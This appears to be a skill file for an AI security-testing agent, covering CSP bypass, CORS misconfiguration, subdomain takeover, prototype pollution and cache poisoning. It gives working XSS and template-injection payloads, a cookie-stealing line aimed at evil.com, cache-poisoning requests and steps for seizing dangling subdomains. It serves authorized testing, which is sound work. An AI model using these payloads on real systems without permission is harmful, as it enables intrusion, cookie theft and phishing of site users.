---
name: web-security-advanced
description: "Advanced web security testing: CSP bypass, CORS, subdomain takeover, cache poisoning, prototype pollution"
category: specialized
tier: powerful
contextBoosts: [api]
toolRefs: [httpRequest, parseResponse, evaluateRendered, findEndpointsInResponse, followRedirects, updateGraph, writeFinding, encodeDecode, getCapturedHeaders]
triggers: ["advanced web security", "csp bypass", "cors testing", "subdomain takeover", "cache poisoning", "prototype pollution", "http security headers", "content security policy", "advanced web testing", "security configuration"]
mitreAttack: ["T1190", "T1046", "T1189"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Advanced Web Security — Payload-Driven Testing

## When to Use
- Target has security headers worth analyzing (CSP, HSTS, X-Frame-Options)
- You need to escalate from reflected XSS to full policy bypass
- CORS headers are present and may be misconfigured
- Subdomains exist that might point to decommissioned services
- Application uses client-side JavaScript frameworks vulnerable to prototype pollution
- CDN or caching layer sits in front of the application

## Do Not Use
- Initial recon phase — use `recon` skill first
- Authentication bypass testing — use `authorization` skill
- Business logic flaws — use `business-logic` skill
- Simple reflected/stored XSS without CSP context — use `vuln-discovery` skill

## Auth Context
Record all authenticated vs unauthenticated differences. Many CSP and CORS configurations change based on authentication state. Test every technique with and without cookies/tokens when the target has login-gated areas. Document which headers appear only in authenticated responses.

---

## 1. CSP Bypass

### Step 1 — Extract and Parse CSP

1. Send a request to the target and capture all response headers
2. Look for `Content-Security-Policy` (primary) and `Content-Security-Policy-Report-Only` (monitoring)
3. Split the header on `;` to get individual directives
4. For each directive, extract the allowed sources (values after the directive keyword)
5. Pay special attention to:
   - `script-src`: where JS can load from (most critical for XSS)
   - `style-src`: where CSS can load from (CSS-based attacks)
   - `connect-src`: where XHR/fetch can send data (exfiltration)
   - `frame-src` / `child-src`: where iframes can load (clickjacking, frame-based attacks)
   - `object-src`: Flash/Java plugin sources
   - `base-uri`: where `<base>` tag can point (redirect all relative URLs)
   - `form-action`: where forms can submit
   - `upgrade-insecure-requests`: forces HTTP→HTTPS (may affect mixed-content attacks)
6. Check for `nonce-<base64>` values — these are one-time tokens for inline scripts
7. Check for `strict-dynamic` — this trusts scripts created by already-trusted scripts

Parse every directive. Log: `script-src`, `style-src`, `img-src`, `connect-src`, `frame-src`, `object-src`, `base-uri`, `form-action`, `upgrade-insecure-requests`.

### Step 2 — Identify Allowed Origins

1. For each directive with external origins, classify them:
   - **Self-hosted**: same domain, subdomains (e.g., `*.target.com`)
   - **Third-party CDNs**: `cdn.jsdelivr.net`, `unpkg.com`, `cdnjs.cloudflare.com`
   - **Services**: `apis.google.com`, `connect.facebook.net`, `accounts.google.com`
   - **Wildcard subdomains**: `*.target.com` (any subdomain works)
   - **Protocol-relative**: `//example.com` (matches HTTP and HTTPS)
   - **Keyword `self`**: same origin (protocol + host + port)
   - **Keyword `unsafe-inline`**: allows inline scripts/styles (weakens CSP significantly)
   - **Keyword `unsafe-eval`**: allows `eval()`, `new Function()` (very weak)
2. Check if any origin is a service that allows user content (e.g., GitHub Pages, Heroku, AWS S3 buckets)
3. Check if any allowed origin has a JSONP endpoint (e.g., `https://example.com/api?callback=...`)
4. Note any `data:` URI allowances — these can be used to inject scripts

### Step 3 — Test Specific Bypasses

**A. JSONP Endpoint on Allowed Origin**

1. Identify an allowed origin that might have a JSONP endpoint (e.g., `https://cdn.target.com`)
2. Probe common JSONP paths: `/api?callback=alert(1)`, `/jsonp?cb=alert(1)`, `/data?callback=alert(1)`
3. If you find a JSONP endpoint, test the CSP bypass:
   - Create an HTML page that loads the JSONP endpoint via `<script src="https://cdn.target.com/api?callback=alert(1)">`
   - If the response is `<script>alert(1)({"data":"..."})</script>` and the script executes → CSP bypassed
4. Even without a known JSONP endpoint, test these common origins for JSONP:
   - `https://www.google.com/complete/search?callback=alert(1)`
   - `https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js`
   - `https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js`
5. The callback parameter can be: `callback`, `cb`, `jsonp`, `_`, `define`

**B. Angular JS Template Injection (if angular in script-src)**

Test with version-specific payloads:
- Angular 1.2.19: `{{'a'.constructor.prototype.push=[].join;$eval('x=alert(1)');}}`
- Angular 1.4.0-1.4.9: `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}`

Additional Angular payloads:
- `<div ng-app>{{$on.constructor('alert(1)')()}}</div>` (Angular 1.x)
- `<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval("x='y=alert(1)';eval(x)");}}</div>`
- Version detection: `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js"></script>` — if it loads, try Angular payloads

**C. Base Tag Hijack (base-uri: self)**

If `base-uri` is not restricted or allows `self`:
1. Inject a `<base href="https://evil.com/">` tag in the page (via DOM manipulation or a reflected injection point)
2. All relative URLs (including script `src`) now resolve to the attacker's domain
3. Even if `script-src` is strict, the `<base>` tag redirects relative paths before CSP checks the resolved URL
4. Test payload: `<base href="https://evil.com/">`
5. Then inject: `<script src="/payload.js"></script>` — resolves to `https://evil.com/payload.js`

**D. data: URI in script-src (even with nonce)**

If `script-src` allows `data:` URIs:
1. Payload: `<script src="data:text/javascript,alert(1)"></script>`
2. With nonce: `<script nonce="stolen-nonce" src="data:text/javascript,alert(1)"></script>`
3. Base64-encoded: `<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>`
4. If `object-src` also allows `data:`: `<object data="data:text/html,<script>alert(1)</script>">`

**E. Webpack Dev Server / Source Maps**

1. Check for `/_next/webpack-hmr` or `/webpack-dev-server` or `/__webpack_hmr`
2. Look for source map files: `*.js.map`, `/*.map`
3. Check response headers for `SourceMap: /path/to/file.map`
4. If source maps are accessible, they may reveal internal paths and build configuration
5. Webpack dev server may allow loading arbitrary modules: `import('attacker-module')`
6. Test: `httpRequest → /main.js.map` — if found, extract source code for further analysis

**F. DOM Clobbering to Bypass script-src**

1. If `script-src` doesn't include `unsafe-inline` but has a CDN origin:
2. Inject HTML that clobbers `document.currentScript` or global variables used by a script loader
3. Example: `<a id="x"><b id="x name="x">` — this creates a DOM element that `document.getElementById('x')` returns
4. Use clobbered values to control script loading: `<a id="CDN_URL" name="https://evil.com/"></a>`
5. If the application does `var cdn = document.getElementById('CDN_URL').href` → attacker-controlled URL loaded as script

### Decision Tree — CSP Response

```
CSP Header Present?
├─ NO → No CSP protection — test for XSS directly
├─ YES → Parse directives
│  ├─ script-src includes 'unsafe-inline'?
│  │  ├─ YES → Inline script injection (direct XSS)
│  │  └─ NO → Need bypass
│  ├─ script-src includes 'unsafe-eval'?
│  │  ├─ YES → eval() based injection possible
│  │  └─ NO → Need bypass
│  ├─ script-src includes specific origins?
│  │  ├─ YES → Test JSONP on allowed origins
│  │  ├─ Check for wildcard subdomains → subdomain takeover vector
│  │  └─ Check for data: URI → data URI script injection
│  ├─ strict-dynamic present?
│  │  ├─ YES → Trusted script creates other scripts → DOM-based vector
│  │  └─ NO → Standard origin-based checks
│  ├─ base-uri not restricted?
│  │  └─ YES → <base> tag hijack
│  └─ nonce present but predictable?
│     └─ YES → Steal nonce from inline element → use in script tag
```

---

## 2. CORS Misconfiguration

### Step 1 — Baseline Reflection Test

1. Send a request to the target with a custom `Origin` header:
   ```
   GET /api/data HTTP/1.1
   Host: target.com
   Origin: https://evil.com
   ```
2. Check the response for:
   - `Access-Control-Allow-Origin: https://evil.com` — reflected origin
   - `Access-Control-Allow-Origin: *` — wildcard (no credentials possible, but can read data)
   - `Access-Control-Allow-Credentials: true` — cookies/Authorization header sent cross-origin
3. If the origin is reflected AND `ACAC: true` → critical CORS misconfiguration (attacker can read authenticated responses)
4. Test with `Origin: null` — some servers allow it

### Step 2 — Full Origin Matrix

Test the following origin variations:
| Origin | Expected | Meaning |
|--------|----------|---------|
| `https://evil.com` | Reject | Different domain |
| `https://target.evil.com` | Reject | Subdomain of attacker |
| `null` | ? | Sandboxed iframe origin |
| `https://target.com` | Accept | Same domain |
| `https://sub.target.com` | ? | Subdomain |
| `https://attacker-target.com` | Reject | Similar domain |
| `http://target.com` | ? | HTTP vs HTTPS |
| `https://target.com.evil.com` | Reject | Subdomain of attacker |
| `https://evil-target.com` | Reject | Typosquatting |
| `https://TARGET.COM` | ? | Case sensitivity |

### Step 3 — Preflight Bypass

1. For non-simple requests (e.g., `PUT`, `DELETE`, custom headers), browsers send a preflight `OPTIONS` request
2. Check the `Access-Control-Allow-Methods` header — which methods are allowed?
3. Check `Access-Control-Allow-Headers` — which custom headers are allowed?
4. Test bypass:
   - If `PUT` is not allowed but `POST` is → use `POST` with `_method=PUT` parameter (if server supports method override)
   - If custom header `X-Custom` is not in allowed list → try using standard headers instead
   - If the preflight response is cached (`Access-Control-Max-Age`) → cached misconfiguration persists

### Step 4 — Null Origin Test

1. Send request with `Origin: null`
2. This origin is sent by:
   - Sandboxed iframes: `<iframe sandbox="allow-scripts" src="https://target.com">`
   - Local HTML files (`file://`)
   - Cross-origin redirects
3. If the server allows `Origin: null` → attacker can use a sandboxed iframe to read data
4. Test payload:
   ```html
   <iframe sandbox="allow-scripts" src="https://target.com/api/data"></iframe>
   <script>
   // Access iframe content after load
   </script>
   ```
5. Some servers check `Referer` instead of `Origin` — test both

### Decision Tree — CORS Response

```
Access-Control-Allow-Origin in response?
├─ NO → No CORS header — browser blocks cross-origin reads
├─ YES → Check value
│  ├─ ACAO: * (wildcard)
│  │  ├─ ACAC: true present? → IGNORED (browsers don't send credentials with *), but check if ACAC is present without ACAO being specific
│  │  └─ ACAC: absent or false → Public API, no credential theft
│  ├─ ACAO: reflects Origin
│  │  ├─ ACAC: true → CRITICAL: cross-origin credential theft possible
│  │  └─ ACAC: false or absent → Read-only cross-origin (no cookies)
│  ├─ ACAO: null
│  │  ├─ ACAC: true → CRITICAL: sandboxed iframe attack
│  │  └─ ACAC: false → Limited exposure
│  └─ ACAO: specific fixed origins
│     └─ ACAC: true → Only those origins can read (check if attacker can register a subdomain)
```

---

## 3. Subdomain Takeover

### Step 1 — Subdomain Enumeration

1. Use multiple sources to find subdomains:
   - DNS records: `dig target.com ANY`, check for wildcard `*.target.com`
   - Certificate Transparency logs: search `crt.sh` for `%.target.com`
   - Historical DNS: check SecurityTrails, VirusTotal, or similar for historical subdomains
   - Brute-force: use `ffuf -u https://FUZZ.target.com -w subdomains.txt` or `amass enum -d target.com`
   - Google dorking: `site:*.target.com -www`
2. For each subdomain found, resolve it to an IP: `dig sub.target.com A`, `nslookup sub.target.com`
3. Check if the IP points to a cloud service (AWS, Azure, GCP, Heroku, etc.) — these are high-value targets
4. Map cloud providers to IP ranges:
   - AWS S3: check if `dig sub.target.com CNAME` → `*.s3.amazonaws.com`
   - Azure: `*.azurewebsites.net`, `*.cloudapp.net`
   - Heroku: `*.herokuapp.com`
   - Fastly: `*.fastly.net`
   - Cloudfront: `*.cloudfront.net`

### Step 2 — Identify Dangling CNAME Records

1. For each subdomain with a CNAME, check if the target service still exists:
   - `dig sub.target.com CNAME` → get the canonical name
   - `dig <cname> A` → if no A record or NXDOMAIN → dangling CNAME (takeover possible)
   - HTTP check: `curl -I https://sub.target.com` → look for error pages mentioning the cloud service
2. Check for these service-specific indicators:
   - **AWS S3**: `NoSuchBucket`, `AccessDenied`, XML error referencing bucket name
   - **GitHub Pages**: `There isn't a GitHub Pages site here.`
   - **Heroku**: `No such app` or `No such account`
   - **Azure**: `404 Web Site not found`, `Azure Web App - Your web app is running`
   - **Shopify**: `Sorry, this shop is currently unavailable.`
   - **Fastly**: `Fastly error: unknown domain`
   - **Pantheon**: `404 error: Unknown site`
   - **Tumblr**: `Whatever you were looking for doesn't currently exist`
   - **WordPress.com**: `Do you want to register`
3. Test with HTTP and HTTPS — some services only respond on one protocol

### Step 3 — Verify Takeover

1. For each candidate dangling CNAME:
   - Confirm the CNAME record still points to the decommissioned service: `dig sub.target.com CNAME`
   - Confirm the service returns a claimable state (not a wildcard catch-all)
   - Try to claim the subdomain on the service (create an account/project with that name)
   - Verify the claim: after claiming, check if `https://sub.target.com` now serves your content
2. Document the chain:
   - DNS record: `sub.target.com CNAME → app.herokuapp.com`
   - Service error: "No such app" page
   - Claimable: Yes/No (some services verify domain ownership first)
3. Check for services that allow claiming without domain verification (these are direct takeover)

### Step 4 — Claim and Exploit

1. If claimable, register the subdomain on the service (create a project named `sub`)
2. Upload a proof-of-concept page: `<h1>Subdomain Takeover Proof</h1>`
3. Verify: `curl https://sub.target.com` shows your page
4. Exploit scenarios:
   - **Cookie theft**: If the subdomain shares cookies with the main domain (`Domain=.target.com`), inject JS that exfiltrates cookies to attacker server
   - **Phishing**: Host a login page that looks identical to the main site
   - **SAML/SSO abuse**: If `login.target.com` is taken over, intercept SAML assertions
   - **CORS bypass**: If the main site trusts `sub.target.com` in CORS policy → read authenticated data
5. Always notify the target of the finding with proof and remediation steps

### Decision Tree — Subdomain Status

```
Subdomain found?
├─ Resolve to IP
│  ├─ Points to active service → Not takeoverable
│  ├─ NXDOMAIN / no A record → Check if CNAME exists
│  │  ├─ CNAME → active service → Not dangling
│  │  └─ CNAME → decommissioned service → DANGLING CNAME
│  │     ├─ Service allows claiming → TAKEOVER POSSIBLE
│  │     └─ Service requires domain verification → MAYBE (check if bypassable)
│  └─ Points to cloud service
│     ├─ Service returns claimable state → TAKEOVER POSSIBLE
│     └─ Service returns generic error → Check further
```

---

## 4. Prototype Pollution

### Step 1 — Identify Client-Side Libraries

1. Examine the page source for script tags — look for library filenames:
   - `lodash.min.js` / `lodash.js` → Lodash (vulnerable to `_.merge` pollution)
   - `angular.min.js` → AngularJS (template injection, not prototype pollution)
   - `jquery.min.js` → jQuery (CVE-2020-11022/11023, XSS)
   - `handlebars.min.js` → Handlebars (prototype pollution in helpers)
   - `express.js` / `next.js` → Server-side frameworks (check for `merge`, `extend`, `defaultsDeep`)
2. Check for build tools: `webpack`, `vite`, `rollup` — these may expose global objects
3. Look for `window.__NEXT_DATA__`, `window.__NUXT__`, `window.__INITIAL_STATE__` — framework state objects
4. Use browser dev tools: search for `Object.assign`, `merge`, `extend`, `defaultsDeep`, `clone`, `cloneDeep` in JS sources

### Step 2 — Common Vulnerable Libraries

| Library | Vulnerable Function | CVE/Technique |
|---------|---------------------|---------------|
| Lodash < 4.17.12 | `_.merge()`, `_.defaultsDeep()` | CVE-2019-10744 |
| jQuery < 3.5.0 | `$()` with HTML string | CVE-2020-11022 |
| Hoek < 5.0.3 | `Hoek.merge()`, `Hoek.applyToDefaults()` | CVE-2018-3728 |
| Mergify | `merge()` | Generic prototype pollution |
| Deepmerge | `deepmerge()` | Conditional, depends on usage |
| Express < 4.17.3 | `res.render()` with user data | CVE-2022-24999 |

### Step 3 — Payload Delivery via URL Parameters

1. Test URL parameter injection:
   ```
   https://target.com/page?__proto__[test]=polluted
   https://target.com/page?constructor[prototype][test]=polluted
   https://target.com/page?toString=polluted
   ```
2. After sending, check if `{}.test === "polluted"` in the browser console
3. Test JSON body injection (if the server deserializes JSON):
   ```json
   {"__proto__": {"polluted": "yes"}}
   ```
4. Test cookie-based injection (if cookies are parsed unsafely):
   ```
   Cookie: __proto__=polluted
   ```
5. Test nested payloads:
   ```
   ?a[__proto__][b][__proto__][c]=1
   ?a[b][c][__proto__]=1
   ```

### Step 4 — Exploitation Payloads

**A. Client-Side XSS via Constructor Override**

1. Pollute `Object.prototype.innerHTML`:
   ```
   ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
   ```
2. If the app does `element.innerHTML = userInput` where `userInput` comes from an object property that inherits the polluted value → XSS
3. Pollute `Object.prototype.src`:
   ```
   ?__proto__[src]=https://evil.com/steal?c=document.cookie
   ```
4. Pollute `Object.prototype.onclick`:
   ```
   ?__proto__[onclick]=alert(1)
   ```
5. Chain with DOM clobbering for more reliable exploitation

**B. Server-Side Privilege Escalation**

1. Pollute properties that affect server-side logic:
   ```
   ?__proto__[admin]=true
   ?__proto__[role]=admin
   ?__proto__[isAdmin]=true
   ```
2. If the server uses `user.admin || defaults.admin` and `defaults` inherits from `Object.prototype` → privilege escalation
3. Pollute `__proto__.hostname` to affect URL parsing:
   ```
   ?__proto__[hostname]=evil.com
   ```
4. Pollute `__proto__.trusted` to bypass validation

**C. DOM Clobbering Chain (Modern)**

1. Create a DOM element that clobbers a constructor:
   ```html
   <form id="constructor"><input id="prototype" name="test=polluted"></form>
   ```
2. When JS does `obj.constructor.prototype.test`, it gets the clobbered value
3. Chain with template literal injection or property access patterns
4. More reliable than pure prototype pollution because it doesn't modify `Object.prototype`

**D. Webpack HMR Poisoning**

1. Check for webpack hot module replacement: `/_next/webpack-hmr`, `/__webpack_hmr`
2. If HMR is enabled in production, the attacker can inject malicious modules
3. Test: send a malformed HMR update packet → observe if the server accepts it
4. If the app exposes `webpackJsonp` or `webpackChunk` globally, test for pollution via chunk loading

### Decision Tree — Pollution Impact

```
Prototype pollution possible?
├─ Client-side only
│  ├─ Gadget found (innerHTML, src, onclick) → XSS
│  ├─ No gadget → Information disclosure (polluted values visible)
│  └─ Framework-specific (Handlebars, Pug) → Template injection
├─ Server-side impact
│  ├─ Property affects auth logic → Privilege escalation
│  ├─ Property affects URL parsing → SSRF / redirect
│  └─ Property affects SQL/query → SQL injection
└─ Both client and server
   └─ Full chain: pollution → XSS + privilege escalation → RCE
```

---

## 5. Web Cache Poisoning

### Step 1 — Identify Unkeyed Inputs

1. Send a request with an unusual header and check if the response changes:
   ```
   GET / HTTP/1.1
   Host: target.com
   X-Forwarded-Host: evil.com
   ```
2. If the response reflects the header → it's unkeyed (the cache doesn't use it for cache key)
3. Test common unkeyed headers:
   - `X-Forwarded-Host` → host header override
   - `X-Original-URL` / `X-Rewrite-URL` → path override
   - `X-HTTP-Method-Override` → method override
   - `X-Forwarded-For` → IP override
   - `X-Host` → host override
   - `X-Real-IP` → IP override
4. Test query parameters:
   - Add `utm_source=evil` → does the cached response change?
   - Add a random parameter → check if it's reflected in the cached version
5. Test cookies:
   - Set a non-standard cookie → check if the response is affected

### Step 2 — Test Unkeyed Headers

For each unkeyed header identified:

1. **X-Forwarded-Host**:
   ```
   GET /page HTTP/1.1
   Host: target.com
   X-Forwarded-Host: evil.com
   ```
   Check if response contains references to `evil.com` (e.g., in links, scripts, canonical URLs)

2. **X-Original-URL**:
   ```
   GET /safe-page HTTP/1.1
   Host: target.com
   X-Original-URL: /admin
   ```
   Check if the response shows admin content even though the URL is `/safe-page`

3. **X-Forwarded-For**:
   ```
   GET /page HTTP/1.1
   Host: target.com
   X-Forwarded-For: 127.0.0.1
   ```
   Check if IP-restricted content becomes accessible

### Step 3 — Exploit Cache Poisoning

**A. XSS via Unkeyed Host Header (Cache Poison → XSS)**

1. Identify that `X-Forwarded-Host` is unkeyed and reflected in the response
2. Send a poisoning request:
   ```
   GET /page HTTP/1.1
   Host: target.com
   X-Forwarded-Host: evil.com"><script>alert(1)</script>
   ```
3. Wait for the cache to store the poisoned response
4. Request the same URL without the malicious header — the cached response now contains the XSS payload
5. Verify by loading `/page` in a browser — if alert(1) fires → cache poisoning to XSS confirmed

**B. Cache Poisoning to Open Redirect**

1. Identify an unkeyed header that affects redirects (e.g., `X-Forwarded-Host`)
2. Poison the cache:
   ```
   GET / HTTP/1.1
   Host: target.com
   X-Forwarded-Host: evil.com
   ```
3. If the response includes a redirect or link to `evil.com` → poisoned
4. The redirect persists in cache → all users visiting `/` get redirected to attacker's site
5. Use for phishing (fake login page on attacker domain)

**C. Cache Deception**

1. Test if the cache misclassifies requests:
   - `GET /account.css HTTP/1.1` — if the cache treats `.css` as static but the server serves account data at this path
   - `GET /profile.js` — similar technique
   - `GET /api/data.css` — if the CDN caches any path ending in a static extension
2. Check if the server serves different content than what the URL suggests:
   - `GET /page.html` → HTML content (cached)
   - `GET /page.html/../api/secret` → if the CDN normalizes the path but the server doesn't → cache deception
3. Test with `Cache-Control` headers:
   - If the poisoned response has `Cache-Control: max-age=3600` → persists for 1 hour
   - If no `Cache-Control` → check `Expires` or `CDN-Cache-Control` headers

**D. Vary Header Bypass**

1. Check if the `Vary` header is present in cached responses:
   - `Vary: Accept-Encoding` → cached separately for different compression algorithms
   - `Vary: Cookie` → cached separately for different cookie values
   - No `Vary` header → same cached response for all clients
2. Test if you can bypass the `Vary` header:
   - If `Vary: Cookie`, test with a specific cookie value to influence the cache
   - If `Vary: Accept-Encoding`, send requests with different `Accept-Encoding` values
3. Check for `CDN-Cache-Control` or `Surrogate-Control` headers that override standard caching

### Decision Tree — Cache Poisoning

```
Unkeyed input identified?
├─ Header-based
│  ├─ Reflected in response → XSS / injection possible
│  ├─ Affects redirect → Open redirect possible
│  └─ Affects auth bypass → Cache-based auth bypass
├─ Query-based
│  ├─ Parameter reflected → Parameter-based cache poisoning
│  └─ Parameter affects logic → Logic-based poisoning
├─ Cookie-based
│  └─ Cookie affects response → Cookie-dependent poisoning
└─ No unkeyed inputs found → Cache poisoning not possible
   └─ Check for cache deception (static extension + dynamic content)
```

---

## Anti-Hallucination

- Every CSP bypass claim must include the full CSP header and the specific origin being exploited
- Every CORS finding must include the exact ACAO header value and whether ACAC: true was present
- Every subdomain takeover must show the dangling CNAME and the service response (not just DNS record)
- Every prototype pollution must include the vulnerable merge/extend call site in the actual JavaScript
- Every cache poisoning must show two consecutive requests: one poisoning, one confirming cached poison
- Never claim a service is "vulnerable to takeover" without verifying the service returns a claimable state
- Never claim CSP is "bypassable" without demonstrating the specific payload loading in the policy context
- Never claim CORS allows cross-origin reads without testing with credentials included

## Trigger Conditions

Activate during advanced configuration testing after recon: when security headers (CSP, HSTS, X-Frame-Options) are present and may be bypassable, CORS headers suggest misconfiguration, subdomains point to possibly decommissioned services (dangling CNAME), client-side frameworks are vulnerable to prototype pollution, or a CDN/cache sits in front. This is an escalation/orchestration skill — for foundational discovery use `recon`; for auth bypasses use `authorization`; for simple XSS use `vuln-discovery`.

## Detection Approach

Work header-by-header and technique-by-technique. For CSP, parse every directive and only attempt bypasses the policy actually permits (JSONP on allowlisted origin, `base-uri` hijack, `strict-dynamic` with a trusted DOM-XSS, nonce reuse, dev-server/source-map leaks). For CORS, run the full origin matrix and preflight/null tests, confirming `ACAC: true` before claiming credential theft. For subdomain takeover, enumerate CNAMEs, identify dangling records, and verify the service returns a claimable state — not just a DNS record. For prototype pollution, locate the merge/extend call site and a gadget. For cache poisoning, find unkeyed inputs and confirm persistence with a clean follow-up. Sequence these as escalations: a reflected XSS becomes critical only once a CSP bypass is proven; a CORS/config issue only matters with credentials.

## Pitfalls

- Claiming a CSP bypass without the full header and a payload that demonstrably loads in that policy.
- Claiming CORS cross-origin reads without testing with credentials included.
- Claiming subdomain takeover from a DNS record alone — the service must return a claimable state.
- Claiming prototype pollution without the actual merge/extend call site and a reachable sink.
- Claiming cache poisoning without two consecutive requests (poison + confirm).
- Running advanced techniques before basic recon — wrong assumptions waste effort.

## Verification & Impact

CONFIRMED when each technique is demonstrated with concrete evidence: the bypassed CSP header + loaded payload, exact ACAO + ACAC with a credentialed cross-origin read, dangling CNAME + claimable service response, merge call site + polluted property + sink, or poison request + clean cached confirmation. SUSPECTED when a misconfiguration is observed but impact isn't reproduced — record as candidate. Document impact by what the advanced technique enables (script execution past CSP, cross-origin data theft, subdomain-controlled phishing pivot, RCE gadget, mass cache XSS). Capture full request/response pairs and policy/header state via `recordEvidence`.
